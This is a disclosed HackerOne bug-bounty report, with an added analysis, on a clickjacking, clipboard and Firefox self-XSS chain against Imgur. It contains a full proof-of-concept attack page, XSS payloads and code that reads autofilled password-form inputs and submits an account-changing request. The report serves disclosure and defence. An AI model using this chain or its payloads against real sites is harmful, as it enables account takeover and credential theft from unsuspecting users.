# Self-XSS with Clickjacking and Frame Detection Leading to Account Takeover in Firefox

## Metadata
- **Source:** HackerOne
- **Report:** 892289 | https://hackerone.com/reports/892289
- **Submitted:** 2020-06-05
- **Reporter:** keer0k
- **Program:** Imgur
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Clickjacking, DOM-Based Self-XSS, Frame Injection, Browser AutoFill Exploitation
- **CVEs:** None
- **Category:** web-api

## Summary
A chained vulnerability combining clickjacking via X-Frame-Options bypass, DOM-based self-XSS in Firefox's beta upload, and frame detection allows an attacker to trick users into copying malicious payloads to clipboard and execute arbitrary code. When combined with Firefox's password autofill feature, this enables account takeover by capturing saved credentials.

## Attack scenario
1. Attacker crafts a malicious webpage that embeds imgur.com using the /embed/embed endpoint to bypass X-Frame-Options restrictions
2. Attacker overlays invisible buttons positioned over the embedded iframe to enable clickjacking and detect when user navigates to upload page via frame counting
3. Attacker uses navigator.clipboard.writeText() API in a loop requesting permission to copy a Firefox-specific XSS payload to victim's clipboard
4. Victim grants clipboard permission, and attacker's self-XSS payload (<<!<script>iframe src=javajavascriptscript:alert()>) is placed in clipboard
5. Attacker tricks victim into pasting payload into vulnerable imgur upload field where self-XSS executes in Firefox
6. If victim has saved password in Firefox, the password field auto-fills and attacker's injected script captures credentials for account takeover

## Root cause
Multiple security misconfigurations: (1) Improper X-Frame-Options enforcement allowing /embed/embed endpoint to bypass framing protection, (2) DOM-based self-XSS in upload.beta page specific to Firefox parser behavior, (3) Ability to detect page context via frame counting without restrictions, (4) No protection against clipboard API abuse or self-XSS payload execution, (5) Reliance on browser autofill in security-sensitive fields

## Attacker mindset
Sophisticated attack chain demonstrating browser-specific exploitation. Attacker identified Firefox's unique parsing quirks to bypass XSS filters, leveraged multiple weak controls (framing, clipboard, XSS filtering) in combination, and exploited legitimate browser features (password autofill) as attack vector. Shows deep understanding of browser security model and frame/clipboard APIs.

## Defensive takeaways
- Implement strict X-Frame-Options: DENY or SAMEORIGIN on all endpoints, audit exceptions for /embed paths
- Deploy Content Security Policy (CSP) with frame-ancestors directive to prevent embedding
- Implement robust input validation and output encoding for all user-supplied content across all browsers
- Disable or restrict clipboard.writeText() API on untrusted domains; require explicit user interaction per write operation
- Never auto-fill sensitive fields like passwords in forms that accept user-generated content or untrusted input
- Implement frame-busting code to prevent parent frame manipulation (window.top === window.self check)
- Use browser-agnostic XSS filtering; test specifically with Firefox and Safari quirks
- Implement Same-Site cookie attribute to prevent credential theft via XSS
- Add iframe sandbox attribute (sandbox='') to restrict capabilities of embedded content

## Variant hunting
Test other embed endpoints (/embed/embed variants) for X-Frame-Options bypass
Hunt for other Safari/Chrome-specific parser quirks similar to Firefox self-XSS payload
Test clipboard.writeText() with different permission models across all major browsers
Identify other auto-fill scenarios (username, email, payment info) that could be exploited
Check for frame-counting detection evasion techniques to bypass the frame.length detection
Test XSS payloads with double/triple encoding combinations: <<!, javajavascript, etc.
Explore POST-based uploads vs GET-based embed pages for XSS vectors
Test iframe sandbox attribute removal or manipulation on other endpoints
Hunt for timing-based attacks using frame load events to trigger actions at precise moments

## MITRE ATT&CK
- T1190
- T1566
- T1199
- T1187
- T1056
- T1598
- T0829

## Notes
Writeup content appears truncated (PoC script cuts off mid-code). Report demonstrates excellent vulnerability chaining but lacks clarity on exact patch applied by vendor and confirmation of actual bounty award. Firefox-specific nature limits real-world impact but highlights importance of cross-browser testing. The combination of social engineering (clipboard permission request) with technical exploitation is particularly sophisticated.

## Full report
<details><summary>Expand</summary>

# Description


Hi, i think i found a valid chaining issues here

## ClickJacking issue

I discovered that have some endpoints that permits to frame imgur.com with some limitations, but even in this case, it is possible to carry out a proof of concept.

One of the cases is in the `/all/` directory of `user.imgur.com`, but in these cases we would be able to make the vulnerability only for a specific user and we would need to fix his subdomain.

The other case is when we enter the embed page of an image, such as `/a/IMAGE_ID/embed`, when we request a page like this, we are usually given the following result:


However, by adding a `/embed` it is possible to open the imgur.com page where the image is located next to the full post, this allows us to access the main domain menu without being blocked by`X-Frame-Options`.

I'm not sure how `X-Frame-Options` is really acting on this web app, but I'm sure it shouldn't be allowed!

ex:

```
<iframe src=http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>
```

## DOM-Based Self-XSS 
There is a self-xss specifically when uploading an image in the beta version of the upload, it is available using Firefox (I couldn't find it in Chrome or Safari) I don't know exactly where XSS happens, but I managed to bypass his rule with the following payload:

`<<!<script>iframe src=javajavascriptscript:alert(document.domain)>`



## frame counting

I realized that there is a big difference in frames on some pages, especially on the upload? Beta page in relation to the others, because on most other pages we have at least more than 3 frames, while on the upload? Beta page we have only 1 frame, and this helped me because I was able to detect the movement I wanted inside an iframe.

With that, when we are framing `/ a / IMAGE_ID / embed / embed` I know that there is more than one frame on the page, and when I click to enter the upload? Beta, the iframe will have only one frame inside so I get to know which page the user is on.

ex:

```
<iframe id=ifr></iframe>
<script>
ifr.onload=function(){
    console.log(ifr.contentWindow.frames.length);
}
</script>
```

## clipboard trick

I used the `navigator.clipboard.writeText()` API so that I can write a text on the victim's clipboard, making this text the Self-XSS payload.

However, the user needs to allow the use of the clipboard API on the page, to allow this use, a message will appear in the top corner of the browser, asking if you allow it or not, of course in this case, we are thinking of a scenario where the user allows this utility.

ex:

```
<script>
setInterval(function(){
    
    navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});

},1000)
</script>
```


## saved passwords in firefox

There is the possibility that the user has saved the password in the browser, and when that happens, in firefox the password is recorded in the input, so in this case it is possible to make an account takeover in the imgur account. On the other hand, when it doesn't, it is still possible to do XSS.


# PoC code

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>PoC</title>
    <style media="screen">
      iframe{
        opacity: 50%;
        width: 1000px;
        height: 500px;

      }
      #content{
        position: relative;
      }
      #btn1{
        position:absolute;
        top: 30px;
        left: 170px;
        vertical-align: middle;
        padding: 0px;
        background-color: #7a297a;
        color:white;
        border: 2px solid #7a297a;
        border-radius: 25px;
        font-size: 20px;
      }
      #btn2{
        position:absolute;
        top: 120px;
        left: 170px;
        vertical-align: middle;
        padding: 0px;
        background-color: #7a297a;
        color:white;
        border: 2px solid #7a297a;
        border-radius: 25px;
        font-size: 20px;
      }
    </style>
  </head>
  <body>

      <div id="btn1">Click Here</div>
    <div id=content>
      <div id="btn2">

      </div>
    <blockquote id="block" class="imgur-embed-pub" lang="en" data-id="a/lz8DAkB/embed">
      <a href="//imgur.com/a/xx">Life is not the same without your loved ones ...</a>
    </blockquote>

      </div>
    <br><br>
    <p style="color: red">copy this text</p>

    <input type="text" name="" value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>">
    <img src=boa.jpeg>
    <script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
    <script type="text/javascript">
    var i = 0;
    var j = 0;
    var ifr = '';
    var x = 0;
    setTimeout(function(){
      ifr = document.querySelector('iframe');
      ifr.style="";
      ifr.removeAttribute("sandbox");
      console.log(ifr);
    },4000)

    setInterval(function(){
      navigator.clipboard.writeText("<<!<script>iframe src=javajavascriptscript:alert(document.domain)>").then(function(text){console.log(text)})
    },1000)
    setInterval(function(){
      if(i==2){
        console.log("stop counter...");
      }
      if(x!=1){
        if(ifr.contentWindow.frames.length==1){
          console.log("page change!");
          btn1.innerHTML="drag the image to here!";
          x=1;
        }
      }

    },1000)

      onmessage=function(event){
        console.log(event);
        i++;
      }

      onpaste=function(){
        console.log("ONPASTE!");
      }

      ondragend=function(){

        btn1.innerHTML="";
        setTimeout(function(){
          btn1.innerHTML="";

          btn2.innerHTML="copy the red text and paste here after that, press enter!";
        },1100)
      }

    </script>
  </body>
</html>
```

Video:  
{F856533}

Para conseguir o account takeover usando esse XSS ainda é necessario abrir uma nova window com `window.open("https://imgur.com/account/settings/password
","_blank")` e depois implementar o seguinte código para conseguir ler os dados presentes nos inputs:

```
  forms = ifr.contentDocument.getElementsByTagName("form")[5];
        inputs = forms.getElementsByTagName("input");body = "";
        for(var i =0; i < inputs.length; i++){
          if(inputs[i].name=="email"){
              inputs[i].value="keerok%40protonmail.com";
          }
          body +=inputs[i].name+"="+inputs[i].value+"&";
        }
        body += "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";

        await fetch("https://imgur.com/account/settings/password", {
          "credentials": "include",
          "headers": {
              "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
              "Content-Type": "application/x-www-form-urlencoded",
              "Upgrade-Insecure-Requests": "1"
          },
          "referrer": "https://imgur.com/account/settings/password",
          "body": body,
          "method": "POST",
          "mode": "cors"
        });
```


Using the same clickjacking trick it is possible to get another xss with less user interaction, I will put this other method in the comments


# Steps to reprocuce - whitout account takeover
1. click in click here
2. drag the image to the text "drag image here"
3. copy the red text to "paste here"
4. press enter or click in any other local of the page
5. XSS will be triggered

## Impact

Account takeover and the attacker can perform malicious action in the victim account

</details>

---
*Analysed by Claude on 2026-05-24*
